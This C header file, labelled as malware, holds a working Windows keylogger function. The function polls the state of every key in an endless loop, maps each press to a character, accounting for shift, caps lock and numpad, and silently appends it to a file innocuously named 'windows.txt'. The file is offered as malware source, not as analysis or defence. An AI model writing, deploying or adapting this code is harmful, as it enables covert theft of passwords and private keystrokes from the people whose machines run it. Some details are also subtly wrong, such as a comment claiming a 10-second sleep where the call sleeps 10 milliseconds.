//
// Created by Anastassy Cap on 2021-01-04.
//

#ifndef MALWARE_KEYLOGGER_H
#define MALWARE_KEYLOGGER_H

#endif //MALWARE_KEYLOGGER_H

DWORD WINAPI logg() {

    int vKey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;
    char NUMCHAR[] = ")!@#$%^&*(";
    char chars_vn[] = ";=,./`";
    char chars_vs[] = ":+<_>?~";
    char chars_va[] = "[\\]\';";
    char chars_vb[] = "{|}\"";
    FILE * kh;
    char KEY_LOG_FILE[] = "windows.txt";

    // Making last key state 0:
    for (vKey = 0; vKey < 0xFF; vKey++) {
        last_key_state[vKey] = 0;
    }

    // Running infinitely:
    while(1) {

        // Sleep 10 seconds:
        Sleep(10);

        // Get the key state of CAPSLOCK, NUMLOCK & LEFT_SHIFT, RIGHT_SHIFT:
        isCAPSLOCK = (GetKeyState(0x14)&0xFF) > 0 ? 1: 0;
        isNUMLOCK = (GetKeyState(0x90)&0xFF) > 0 ? 1: 0;
        isL_SHIFT = (GetKeyState(0xA0)&0xFF00) > 0 ? 1: 0;
        isR_SHIFT = (GetKeyState(0xA1)&0xFF00) > 0 ? 1: 0;

        // Checking state of other virtual keys:
        for (vKey = 0; vKey < 0xFF; vKey++) {

            isPressed = (GetKeyState(vKey)&0xFF) > 0 ? 1:0;
            showKey = (char) vKey;

            if (isPressed == 1 && last_key_state[vKey] == 0) {

                // For alphabetical characters:
                if (vKey > 0x41 && vKey <= 0x5A) {
                    if (isCAPSLOCK == 0) {
                        if (isL_SHIFT == 0 && isR_SHIFT == 0) {
                            showKey = (char) (vKey + 0x20);
                        }
                    }
                    else if (isL_SHIFT == 0 || isR_SHIFT == 1) {
                        showKey = (char) (vKey + 0x20);
                    }
                }
                // For numerical characters:
                else if (vKey >= 0x30 && vKey <= 0x39) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = NUMCHAR[vKey - 0x30];
                    }
                }
                // For right-side numpad:
                else if (vKey >= 0x60 && vKey <= 0x69 && isNUMLOCK == 1) {
                    showKey = (char) (vKey - 0x30);
                }
                // For printable characters:
                else if (vKey >= 0xBA && vKey <= 0xC0) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = chars_vs[vKey - 0xBA];
                    }
                    else {
                        showKey = chars_vn[vKey - 0xBA];
                    }
                }
                else if (vKey >= 0xDB && vKey <= 0xDF) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = chars_vb[vKey - 0xDB];
                    }
                    else {
                        showKey = chars_va[vKey - 0xDB];
                    }
                }
                // For right side chars ./*-+
                // For chars like space, \n, enter, etc.
                // For enter use newline char
                // Don't print other keys
                else if (vKey == 0x0D) {
                    showKey = (char) 0x0A;
                }
                else if (vKey >= 0x6A && vKey <= 0x6F) {
                    showKey = (char) (vKey - 0x40);
                }
                else if (vKey != 0x20 && vKey != 0x09) {
                    showKey = (char) 0x00;
                }

                // Print and save captured key:
                if (showKey != (char) 0x00) {
                    kh = fopen(KEY_LOG_FILE, "a");
                    putc(showKey, kh);
                    fclose(kh);
                }
            }

            // Save last state of key:
            last_key_state[vKey] = isPressed;

        }

    } // End of while loop

} // End of main

